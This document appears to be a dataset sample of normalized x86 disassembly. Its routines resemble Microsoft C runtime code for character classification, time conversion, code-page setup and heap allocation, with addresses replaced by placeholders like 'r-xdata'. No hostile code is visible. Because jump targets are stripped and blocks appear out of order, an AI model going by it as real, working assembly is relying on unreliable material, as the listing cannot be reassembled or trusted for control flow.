xor ebx ebx
jmp r-xdata
movzx cx [ edi ]
movzx eax cl
inc edi
mov [ ebp + 0xc ] ecx
test [ eax + rw-data ] 0x4
je r-xdata
sub_42f00a
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
mov [ ebp + 0xb ] cl
shr eax 0x8
cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
pop edi
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ecx * 2 ]
and eax 0x4
leave
retn
push 0x4
push ecx
call sub_430f15
pop ecx
pop ecx
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp + 0xa ]
push 0x2
push eax
push 0x1
call sub_4349a8
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x4
je r-xdata
push 0x1
pop eax
leave
retn
sub_42f0a0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_42f0cf
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
mov [ ebp + 0xb ] cl
shr eax 0x8
cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
pop edi
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ecx * 2 ]
and eax 0x8
leave
retn
push 0x8
push ecx
call sub_430f15
pop ecx
pop ecx
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp + 0xa ]
push 0x2
push eax
push 0x1
call sub_4349a8
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x8
je r-xdata
push 0x1
pop eax
leave
retn
sub_42f16c
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x14 ]
cmp ecx 0x45
jl r-xdata
or eax 0xffffffff
cmp ecx 0x8b
jg r-xdata
mov esi [ edi + 0x10 ]
test esi esi
jl r-xdata
push ebx
mov eax esi
push 0xc
cdq
pop ebx
idiv ebx
push ebx
add ecx eax
mov eax esi
cdq
pop esi
pop ebx
idiv esi
test edx edx
mov [ edi + 0x10 ] edx
jge r-xdata
cmp esi 0xb
jle r-xdata
cmp ecx 0x45
jl r-xdata
add edx 0xc
dec ecx
mov [ edi + 0x10 ] edx
mov edx [ edi + 0x10 ]
test cl 0x3
mov eax [ edx * 4 + rw-data ]
jne r-xdata
cmp ecx 0x8b
jg r-xdata
lea edx [ ecx - 0x1 ]
imul ecx ecx 0x16d
sar edx 0x2
add eax edx
lea eax [ ecx + eax - 0x63df ]
mov ecx [ edi + 0xc ]
test eax eax
lea esi [ eax + ecx ]
jl r-xdata
cmp edx 0x1
jle r-xdata
test ecx ecx
jge r-xdata
test ecx ecx
jl r-xdata
inc eax
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x18
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x8 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x4 ]
test ecx ecx
lea esi [ eax + ecx ]
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
mov ecx esi
imul ecx ecx 0x3c
test esi esi
je r-xdata
test esi esi
jge r-xdata
test esi esi
jl r-xdata
xor eax eax
mov eax ecx
cdq
idiv esi
xor edx edx
cmp eax 0x3c
setne dl
mov eax edx
jmp r-xdata
jmp r-xdata
mov eax [ edi ]
test ecx ecx
lea edx [ eax + ecx ]
mov [ ebp + 0x8 ] edx
jl r-xdata
test eax eax
jne r-xdata
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test edx edx
jge r-xdata
test edx edx
jl r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_42f350
test eax eax
pop ecx
je r-xdata
call sub_434af1
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_42f45a
test eax eax
pop ecx
je r-xdata
jmp r-xdata
push 0x9
mov esi eax
mov eax [ ebp + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x20 ]
test ecx ecx
jg r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ rw-data ]
add [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_42f45a
pop ecx
jmp r-xdata
jge r-xdata
cmp [ eax + 0x20 ] 0x0
jle r-xdata
sub_42f350
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov esi [ eax ]
xor ebx ebx
call sub_430be3
test esi esi
mov edi eax
jge r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x40 ]
push 0x24
call sub_42dd9c
pop ecx
mov [ edi + 0x40 ] eax
test eax eax
mov ecx rw-data
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov [ ecx + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ ecx + 0x1c ] eax
imul eax eax 0xfffeae80
add esi eax
test ebx ebx
jne r-xdata
sub esi eax
inc edx
cmp esi eax
jl r-xdata
mov eax esi
mov edi 0x7861f80
cdq
idiv edi
mov edx eax
imul edx edx 0xf879e080
add esi edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
push 0x1
pop eax
lea ebx [ edi + 0x4 ]
mov edi rw-data
sub esi eax
mov eax 0x1e28500
inc edx
cmp esi eax
jl r-xdata
mov edx [ ecx + 0x1c ]
dec eax
mov [ ecx + 0x10 ] eax
push 0x7
sub edx [ edi + eax * 4 ]
mov eax [ esp + 0x14 ]
mov edi 0x15180
mov [ ecx + 0xc ] edx
mov eax [ eax ]
cdq
idiv edi
pop edi
push 0x3c
add eax 0x4
cdq
idiv edi
mov eax esi
mov edi 0xe10
mov [ ecx + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ ecx + 0x8 ] eax
imul eax eax 0xfffff1f0
add esi eax
mov eax esi
cdq
idiv edi
mov [ ecx + 0x4 ] eax
imul eax eax 0x3c
sub esi eax
and [ ecx + 0x20 ] 0x0
mov [ ecx ] esi
mov eax ecx
inc eax
add ebx 0x4
jmp r-xdata
push 0x1
pop ebx
inc edx
sub esi eax
jmp r-xdata
cmp [ ebx ] edx
jge r-xdata
sub_42f45a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jge r-xdata
call sub_434af1
mov eax [ esi ]
cmp eax 0x3f480
jle r-xdata
xor eax eax
jmp r-xdata
push esi
call sub_42f350
mov esi eax
push esi
call sub_434da6
pop ecx
test eax eax
mov eax [ esi ]
pop ecx
je r-xdata
cmp eax 0x7ffc0b7f
jge r-xdata
pop esi
pop ebp
retn
sub eax [ rw-data ]
push edi
push 0x3c
mov [ ebp + 0x8 ] eax
pop ecx
cdq
mov edi ecx
idiv edi
test edx edx
mov [ esi ] edx
jge r-xdata
sub eax [ rw-data ]
sub eax [ rw-data ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_42f350
cmp [ rw-data ] 0x0
pop ecx
mov esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi ecx
cdq
idiv edi
add eax [ esi + 0x4 ]
mov [ ebp + 0x8 ] eax
cdq
idiv edi
pop edi
test edx edx
mov [ esi + 0x4 ] edx
jge r-xdata
add edx ecx
mov [ esi ] edx
sub [ ebp + 0x8 ] ecx
mov eax esi
push esi
call sub_434da6
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
idiv ecx
pop ecx
add eax [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
cdq
idiv ecx
test edx edx
mov [ esi + 0x8 ] edx
jge r-xdata
add edx 0x3c
mov [ esi + 0x4 ] edx
sub [ ebp + 0x8 ] ecx
mov eax [ rw-data ]
sub [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
call sub_42f350
mov esi eax
pop ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push 0x18
cdq
pop ecx
idiv ecx
mov ecx eax
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
add edx ecx
mov [ esi + 0x8 ] edx
sub [ ebp + 0x8 ] ecx
jge r-xdata
mov eax [ esi + 0x18 ]
push 0x7
add eax ecx
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0x18 ]
push 0x7
lea eax [ eax + ecx + 0x7 ]
pop ecx
cdq
idiv ecx
mov [ esi + 0x18 ] edx
mov eax [ ebp + 0x8 ]
add [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
test eax eax
jg r-xdata
mov eax [ ebp + 0x8 ]
add [ esi + 0x1c ] eax
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x1c ] 0x16c
mov [ esi + 0x10 ] 0xb
jmp r-xdata
sub_42f5ba
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_430d2a
push [ ebp + 0x8 ]
call sub_42f767
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_42f7e4
xor edx edx
mov eax rw-data
push 0x19
call sub_430d8b
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jb r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_42f7b1
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_42f80d
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_42f7b1
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_42f767
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_42f7b1
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_42f7e4
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_42f80d
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_4349a8
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_43452a
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_43452a
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_42f9ae
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_42eea0
inc eax
push eax
call sub_42dd9c
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_4350c0
pop ecx
pop ecx
pop esi
retn
sub_42f9d9
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
cmp esi 0xffffffe0
jbe r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_430d2a
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
push edi
call sub_4330bb
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
test esi esi
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_42fa6b
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
cmp esi [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov edi [ ebp + 0x8 ]
push edi
call sub_433e16
add esp 0xc
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x1c ]
jmp r-xdata
push esi
push edi
push eax
call sub_4338c4
add esp 0xc
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_42fb00
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
cmp esi [ rw-data ]
ja r-xdata
mov [ ebp - 0x1c ] edi
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_42d472
pop ecx
pop ecx
jmp r-xdata
shr esi 0x4
push esi
push eax
push [ ebp - 0x24 ]
push [ ebp - 0x2c ]
call sub_4341de
add esp 0x10
test eax eax
je r-xdata
push esi
push [ ebp + 0x8 ]
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] edi
sub_42fb3d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_430d2a
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
push esi
call sub_4330bb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call sub_433e16
add esp 0xc
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov esi [ ebp - 0x20 ]
mov esi [ esi - 0x4 ]
sub esi 0x9
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi [ ebp - 0x20 ]
movzx esi [ eax ]
shl esi 0x4
mov [ ebp - 0x20 ] esi
jmp r-xdata
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_42fba7
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_42fc22
cmp [ ebp - 0x28 ] 0x0
sub_42fc2b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x1c ] esi
cmp esi 0xffffffe0
ja r-xdata
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
jmp r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x20 ]
cmp [ rw-data ] ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ rw-data ]
ja r-xdata
mov [ ebp - 0x20 ] ebx
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_433058
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_43340f
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_42fcc4
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_433eb2
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_42fd4d
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push ebx
push [ ebp - 0x20 ]
call sub_42dc30
add esp 0xc
sub_42fd68
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ esp + 0xc ] edi
jb r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x19
call sub_430d2a
movzx eax [ edi - 0x1 ]
lea esi [ edi - 0x1 ]
pop ecx
test [ eax + rw-data ] 0x4
je r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop edi
pop esi
retn
dec esi
cmp [ esp + 0xc ] esi
ja r-xdata
push 0x19
call sub_430d8b
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
push 0x19
call sub_430d8b
pop ecx
mov eax edi
mov ecx edi
sub ecx esi
and ecx 0x1
sub eax ecx
dec eax
movzx eax [ esi ]
test [ eax + rw-data ] 0x4
jne r-xdata
sub_42fdd5
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
mov dx [ ecx ]
lea esi [ eax + 0x2 ]
mov [ eax ] dx
pop esi
retn
mov dx [ ecx ]
mov [ esi ] dx
inc esi
inc esi
jmp r-xdata
inc ecx
inc ecx
test dx dx
je r-xdata
sub_42fdfa
mov ecx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0xc ]
test ecx ecx
mov esi edi
je r-xdata
mov eax esi
pop edi
pop esi
retn
mov edx [ esp + 0x10 ]
test ecx ecx
je r-xdata
dec ecx
jne r-xdata
dec ecx
je r-xdata
mov ax [ edx ]
mov [ edi ] ax
inc edi
inc edi
inc edx
inc edx
test ax ax
je r-xdata
xor eax eax
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_42fe37
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
push [ ebp + 0xc ]
call sub_42dd9c
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
push ebx
call sub_42ded6
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
cmp esi 0xffffffe0
ja r-xdata
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_4330bb
pop ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp esi edi
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
cmp esi edi
jbe r-xdata
cmp [ rw-data ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_42ffc2
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_430d2a
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push ebx
call sub_433e16
add esp 0xc
mov edi eax
mov [ ebp - 0x30 ] edi
test edi edi
je r-xdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
jmp r-xdata
push esi
call sub_433058
pop ecx
test eax eax
jne r-xdata
cmp esi edi
jne r-xdata
cmp [ ebp - 0x24 ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_4338c4
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_433058
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp esi [ rw-data ]
jae r-xdata
mov [ ebp + 0xc ] esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x24 ] eax
push 0x1
pop esi
cmp esi edi
jne r-xdata
push esi
call sub_43340f
pop ecx
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x24 ] ebx
jmp r-xdata
push esi
call sub_433058
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ebx esi
shr ebx 0x4
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_4341de
add esp 0x10
test eax eax
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax edi
je r-xdata
push 0x1
pop esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_430110
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
push ebx
call sub_433eb2
pop ecx
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
mov [ ebp - 0x20 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_42e2d0
push ebx
call sub_4330bb
mov [ ebp - 0x28 ] eax
push ebx
push eax
call sub_4330e6
add esp 0x18
mov eax esi
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ edi ]
shl eax 0x4
mov [ ebp - 0x34 ] eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x24 ]
call sub_42e2d0
push ebx
push [ ebp - 0x28 ]
call sub_4330e6
add esp 0x14
mov eax esi
push eax
push ebx
push [ ebp - 0x24 ]
call sub_42e2d0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_433e6d
add esp 0x18
jmp r-xdata
mov eax esi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
call sub_42e2d0
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x38 ]
call sub_433e6d
add esp 0x18
